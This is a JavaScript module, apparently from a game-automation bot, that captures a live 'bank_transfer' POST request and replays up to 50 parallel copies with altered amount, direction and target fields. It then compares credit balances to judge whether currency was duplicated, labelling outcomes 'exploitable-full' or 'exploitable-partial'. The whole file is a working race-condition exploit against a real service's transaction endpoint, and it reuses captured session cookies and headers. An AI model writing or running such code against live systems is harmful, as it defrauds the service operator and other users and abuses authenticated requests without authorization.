import { getPage, getGameSnapshot } from './cdp.js';

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const readLedger = async () => {
  const snap = await getGameSnapshot().catch(() => null);
  const ex = snap?.extracted || {};
  return {
    bank: typeof ex.creditsBank === 'number' ? ex.creditsBank : null,
    hand: typeof ex.creditsOnHand === 'number' ? ex.creditsOnHand : null,
    at: new Date().toISOString()
  };
};

const state = {
  listener: null,      // attached request handler
  page: null,          // page the listener is attached to
  armed: false,
  lastCapture: null,   // { url, method, headers, body (parsed), capturedAt }
  lastError: null
};

const log = (emoji, msg, extra = {}) => {
  const suffix = Object.keys(extra).length ? ' ' + JSON.stringify(extra) : '';
  console.log(`${emoji} ${new Date().toISOString()} [glitch] ${msg}${suffix}`);
};

const matchesBankTransfer = (url = '') => /\/bank_transfer(\?|$)/.test(url);

const detachListener = () => {
  if (state.listener && state.page && !state.page.isClosed()) {
    try { state.page.off('request', state.listener); } catch { /* ignore */ }
  }
  state.listener = null;
  state.page = null;
};

const handleRequest = (req) => {
  try {
    const url = req.url();
    if (!matchesBankTransfer(url)) return;
    const method = req.method();
    if (method !== 'POST') return;
    const headers = req.headers();
    const rawBody = req.postData() || '';
    let body = null;
    try { body = JSON.parse(rawBody); } catch { body = rawBody; }
    state.lastCapture = {
      url,
      method,
      headers,
      body,
      capturedAt: new Date().toISOString()
    };
    log('🎯', 'captured bank_transfer', {
      direction: body?.direction,
      amount: body?.amount,
      target: body?.target_player_name ?? body?.character_id
    });
  } catch (err) {
    state.lastError = err.message;
    log('⚠️', 'capture handler error', { err: err.message });
  }
};

export const armCapture = async () => {
  const page = await getPage();
  if (state.armed && state.page === page) {
    return { ok: true, armed: true, already: true };
  }
  detachListener();
  state.page = page;
  state.listener = handleRequest;
  page.on('request', handleRequest);
  state.armed = true;
  state.lastError = null;
  log('🟢', 'armed — waiting for a real bank_transfer to learn shape');
  return { ok: true, armed: true };
};

export const disarmCapture = () => {
  detachListener();
  state.armed = false;
  log('⚪', 'disarmed');
  return { ok: true, armed: false };
};

const redactHeaders = (headers) => {
  const out = {};
  for (const [k, v] of Object.entries(headers || {})) {
    const lc = k.toLowerCase();
    if (lc === 'authorization' || lc === 'apikey' || lc === 'cookie') {
      out[k] = typeof v === 'string' ? `${v.slice(0, 12)}…(${v.length})` : '[redacted]';
    } else {
      out[k] = v;
    }
  }
  return out;
};

export const getState = () => ({
  armed: state.armed,
  hasCapture: !!state.lastCapture,
  lastError: state.lastError,
  capture: state.lastCapture ? {
    url: state.lastCapture.url,
    method: state.lastCapture.method,
    headers: redactHeaders(state.lastCapture.headers),
    body: state.lastCapture.body,
    capturedAt: state.lastCapture.capturedAt
  } : null
});

export const clearCapture = () => {
  state.lastCapture = null;
  return { ok: true };
};

// Fire N parallel clones of the captured request, overriding body fields.
// overrides: { amount?, direction?, target_player_name?, character_id?, ship_id? }
export const fireGlitch = async ({ count, overrides = {} } = {}) => {
  if (!state.lastCapture) {
    return { ok: false, error: 'no capture — arm and trigger one real bank_transfer first' };
  }
  const n = Math.max(1, Math.min(50, Number(count) || 1));
  const cap = state.lastCapture;
  const body = { ...(typeof cap.body === 'object' && cap.body ? cap.body : {}), ...overrides };
  // Strip auto-injected bot fields that may not apply on replay.
  const url = cap.url;
  const headers = { ...cap.headers };
  // Remove headers the browser sets itself on fetch — these cause errors if forced.
  for (const k of Object.keys(headers)) {
    const lc = k.toLowerCase();
    if (lc.startsWith(':') || lc === 'content-length' || lc === 'host' || lc === 'connection') {
      delete headers[k];
    }
  }
  const page = await getPage();
  const before = await readLedger();
  log('🚀', 'firing parallel bank_transfer', {
    n, direction: body.direction, amount: body.amount,
    bankBefore: before.bank, handBefore: before.hand
  });
  const results = await page.evaluate(async ({ url, headers, body, n }) => {
    const encoded = JSON.stringify(body);
    const t0 = performance.now();
    const tasks = Array.from({ length: n }, (_, i) => (async () => {
      const start = performance.now();
      try {
        const res = await fetch(url, {
          method: 'POST',
          headers,
          body: encoded,
          credentials: 'include'
        });
        const durationMs = performance.now() - start;
        const text = await res.text();
        let json = null;
        try { json = JSON.parse(text); } catch { /* leave null */ }
        return {
          i,
          ok: res.ok,
          status: res.status,
          durationMs: Math.round(durationMs),
          body: json ?? text.slice(0, 400)
        };
      } catch (err) {
        return {
          i,
          ok: false,
          status: 0,
          durationMs: Math.round(performance.now() - start),
          error: (err && err.message) || String(err)
        };
      }
    })());
    const out = await Promise.all(tasks);
    return { totalMs: Math.round(performance.now() - t0), out };
  }, { url, headers, body, n });
  const okCount = results.out.filter((r) => r.ok).length;
  // Give the game UI a moment to refresh the DOM (the game may re-fetch on
  // completion of the last RPC). We snapshot twice — once immediately after
  // the fetches resolve and once after a short settle — so the user can see
  // if later polls changed anything.
  await sleep(800);
  const afterEarly = await readLedger();
  await sleep(1500);
  const afterSettled = await readLedger();
  const amount = Number(body.amount) || 0;
  const direction = body.direction;
  // Expected delta if rows were serialized (one of N wins):
  //   deposit  → bank +amount, hand -amount
  //   withdraw → bank -amount, hand +amount
  // Observed delta:
  const bankDelta = (afterSettled.bank != null && before.bank != null) ? afterSettled.bank - before.bank : null;
  const handDelta = (afterSettled.hand != null && before.hand != null) ? afterSettled.hand - before.hand : null;
  const expectedBankDelta = direction === 'deposit' ? amount : direction === 'withdraw' ? -amount : null;
  const expectedHandDelta = direction === 'deposit' ? -amount : direction === 'withdraw' ? amount : null;
  const naiveBankDelta = expectedBankDelta != null ? expectedBankDelta * okCount : null;
  const naiveHandDelta = expectedHandDelta != null ? expectedHandDelta * okCount : null;
  // Heuristic verdict:
  //   - bankDelta matches expectedBankDelta (1×)      → serialized, not exploitable
  //   - bankDelta matches naiveBankDelta (N×)         → EXPLOITABLE, full duplication
  //   - bankDelta between 1× and N×                    → PARTIAL race (M of N duplicated)
  //   - bankDelta null / no read                       → unknown (stale DOM)
  let verdict = 'unknown';
  let duplicated = null;
  if (bankDelta != null && expectedBankDelta != null && amount > 0) {
    const ratio = bankDelta / expectedBankDelta;
    duplicated = Math.round(ratio);
    if (Math.abs(ratio - 1) < 0.01) verdict = 'serialized';
    else if (Math.abs(ratio - okCount) < 0.01) verdict = 'exploitable-full';
    else if (ratio > 1.5) verdict = 'exploitable-partial';
    else verdict = 'unexpected';
  } else if (okCount === 0) {
    verdict = 'all-failed';
  }
  log('🏁', 'parallel fire complete', {
    total: n, ok: okCount, fail: n - okCount, totalMs: results.totalMs,
    bankBefore: before.bank, bankAfter: afterSettled.bank, bankDelta,
    handBefore: before.hand, handAfter: afterSettled.hand, handDelta,
    verdict, duplicated
  });
  return {
    ok: true,
    count: n,
    okCount,
    failCount: n - okCount,
    totalMs: results.totalMs,
    sentBody: body,
    results: results.out,
    ledger: {
      before,
      afterEarly,
      afterSettled,
      bankDelta,
      handDelta,
      expectedBankDelta,
      expectedHandDelta,
      naiveBankDelta,
      naiveHandDelta
    },
    verdict,
    duplicated
  };
};
